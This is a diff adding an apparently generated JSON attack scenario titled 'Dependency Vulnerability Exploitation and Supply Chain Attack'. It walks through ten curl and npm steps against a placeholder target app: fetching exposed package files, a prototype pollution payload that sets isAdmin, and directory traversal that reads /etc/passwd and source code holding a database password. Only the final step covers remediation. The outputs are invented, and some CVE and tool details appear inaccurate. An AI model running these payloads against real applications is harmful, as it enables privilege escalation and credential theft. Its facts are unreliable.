@@ -1,0 +1,78 @@
+{
+  "title": "Dependency Vulnerability Exploitation and Supply Chain Attack",
+  "description": "Discovering and exploiting vulnerable npm dependencies in a production application",
+  "steps": [
+    {
+      "step": 1,
+      "description": "Enumerate installed dependencies in target application",
+      "command": "curl https://target-app.com/package.json",
+      "expected_output": "{\n  \"dependencies\": {\n    \"express\": \"4.16.0\",\n    \"lodash\": \"4.17.4\",\n    \"axios\": \"0.18.0\"\n  }\n}",
+      "technical_detail": "Many applications expose package.json or have predictable paths revealing dependencies"
+    },
+    {
+      "step": 2,
+      "description": "Audit discovered dependencies for known vulnerabilities",
+      "command": "echo '{\"dependencies\":{\"lodash\":\"4.17.4\"}}' > package.json && npm audit",
+      "expected_output": "found 3 high severity vulnerabilities\n  Prototype Pollution in lodash\n  Package: lodash\n  Patched in: >=4.17.21\n  More info: https://npmjs.com/advisories/1673",
+      "technical_detail": "lodash 4.17.4 has critical prototype pollution vulnerability"
+    },
+    {
+      "step": 3,
+      "description": "Research exploit techniques for identified vulnerability",
+      "command": "npm view lodash@4.17.4 --json | grep -A5 vulnerabilities",
+      "expected_output": "CVE-2019-10744: Prototype Pollution\nCVE-2020-8203: Prototype Pollution via _.zipObjectDeep\nPOCs available on security research sites",
+      "technical_detail": "Multiple documented prototype pollution vectors exist"
+    },
+    {
+      "step": 4,
+      "description": "Craft prototype pollution payload exploiting lodash vulnerability",
+      "command": "curl -X POST https://target-app.com/api/user/update -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true}}'",
+      "expected_output": "HTTP 200 OK\n{\"status\":\"success\",\"user\":\"updated\"}",
+      "technical_detail": "Pollutes Object prototype, potentially granting admin privileges"
+    },
+    {
+      "step": 5,
+      "description": "Verify privilege escalation through polluted prototype",
+      "command": "curl https://target-app.com/api/admin/users -H 'Cookie: session=abc123'",
+      "expected_output": "HTTP 200 OK\n[\n  {\"id\":1,\"username\":\"admin\",\"role\":\"administrator\"},\n  {\"id\":2,\"username\":\"user\",\"role\":\"user\"}\n]",
+      "technical_detail": "Successfully accessed admin endpoint due to prototype pollution"
+    },
+    {
+      "step": 6,
+      "description": "Enumerate package-lock.json for complete dependency tree",
+      "command": "curl https://target-app.com/package-lock.json | jq '.dependencies | keys'",
+      "expected_output": "[\"axios\",\"body-parser\",\"debug\",\"express\",\"lodash\",\"ms\"]",
+      "technical_detail": "Package-lock reveals transitive dependencies not visible in package.json"
+    },
+    {
+      "step": 7,
+      "description": "Identify outdated transitive dependencies with known exploits",
+      "command": "echo '{\"dependencies\":{\"express\":\"4.16.0\"}}' > package.json && npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity==\"high\")'",
+      "expected_output": "{\"key\":\"send\",\"value\":{\"severity\":\"high\",\"via\":[\"CVE-2022-24999\"],\"effects\":[\"express\"]}}",
+      "technical_detail": "Transitive dependency 'send' has directory traversal vulnerability"
+    },
+    {
+      "step": 8,
+      "description": "Exploit directory traversal in outdated send package",
+      "command": "curl 'https://target-app.com/static/..%2f..%2f..%2fetc%2fpasswd'",
+      "expected_output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
+      "technical_detail": "Successfully read /etc/passwd via directory traversal"
+    },
+    {
+      "step": 9,
+      "description": "Attempt to read application source code and credentials",
+      "command": "curl 'https://target-app.com/static/..%2f..%2fserver.js'",
+      "expected_output": "const express = require('express');\nconst DB_PASSWORD = 'super_secret_123';\nconst app = express();\n// Application source code exposed",
+      "technical_detail": "Directory traversal allows reading arbitrary files including source"
+    },
+    {
+      "step": 10,
+      "description": "Document findings and create remediation report",
+      "command": "npm audit fix --package-lock-only --dry-run",
+      "expected_output": "fixed 3 of 3 vulnerabilities\n  lodash  4.17.4 -> 4.17.21\n  send    0.16.1 -> 0.18.0 (via express@4.18.2)\nRecommended: Update express to 4.18.2+ and lodash to 4.17.21+",
+      "technical_detail": "Provides clear remediation path for development team"
+    }
+  ],
+  "impact": "Achieved privilege escalation and arbitrary file read through outdated npm dependencies, demonstrating critical supply chain security risks",
+  "created_by": "neural_mesh_v5.2_generator"
+}
